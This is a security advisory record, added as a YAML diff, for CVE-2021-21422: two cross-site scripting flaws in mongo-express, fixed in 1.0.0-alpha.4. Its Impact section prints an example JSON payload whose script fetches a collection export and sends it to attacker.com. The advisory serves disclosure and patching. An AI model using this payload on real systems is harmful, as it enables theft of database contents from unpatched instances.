@@ -1,0 +1,58 @@
+advisory_id: GHSA-7p8h-86p5-wv3p
+datasource_id: github_osv_importer_v2/GHSA-7p8h-86p5-wv3p
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/06/GHSA-7p8h-86p5-wv3p/GHSA-7p8h-86p5-wv3p.json
+aliases:
+  - CVE-2021-21422
+summary: |
+  Cross-site scripting
+  Two kinds of XSS were found:
+
+  1.  As mentioned in https://github.com/mongo-express/mongo-express/issues/577 when the content of a cell grows larger than supported size, clicking on a row will show full document unescaped, however this needs admin interaction on cell.
+  2. Data cells identified as media will be rendered as media, without being sanitized. Example of different renders: image, audio, video, etc.
+
+
+
+  ### Impact
+  As an example of type 1 attack, an unauthorized user who only can send a large amount of data in a field of a document may use this payload:
+  ```JSON
+  {"someField": "long string here to surpass the limit of document ...... <script> await fetch('http://localhost:8081/db/testdb/export/users').then( async res =>  await fetch('http://attacker.com?backup='+encodeURIComponent((await res.text())))) </script>"  }
+  ```
+  This will send an export of a collection to the attacker without even admin knowing. Other types of attacks such as dropping a database\collection are also possible.
+
+  ### Patches
+  Upgrade to  `v1.0.0-alpha.4`
+
+  ### For more information
+  If you have any questions or comments about this advisory:
+  * Open an issue in [mongo-express](https://github.com/mongo-express/mongo-express/issues/new)
+  * Email me at [jafar.akhoondali@gmail.com](mailto:jafar.akhoondali@gmail.com)
+impacted_packages:
+  - purl: pkg:npm/mongo-express
+    affected_versions: vers:npm/<=1.0.0-alpha.2
+    fixed_versions: vers:npm/1.0.0-alpha.4
+severities:
+  - score: '8.1'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N
+    published_at: None
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2021/06/GHSA-7p8h-86p5-wv3p/GHSA-7p8h-86p5-wv3p.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url:
+weaknesses:
+  - CWE-79
+references:
+  - url: https://github.com/mongo-express/mongo-express/commit/f5e0d4931f856f032f22664b5e5901d5950cfd4b
+    reference_type:
+    reference_id:
+  - url: https://github.com/mongo-express/mongo-express/issues/577
+    reference_type:
+    reference_id:
+  - url: https://github.com/mongo-express/mongo-express/security/advisories/GHSA-7p8h-86p5-wv3p
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2021-21422
+    reference_type:
+    reference_id:
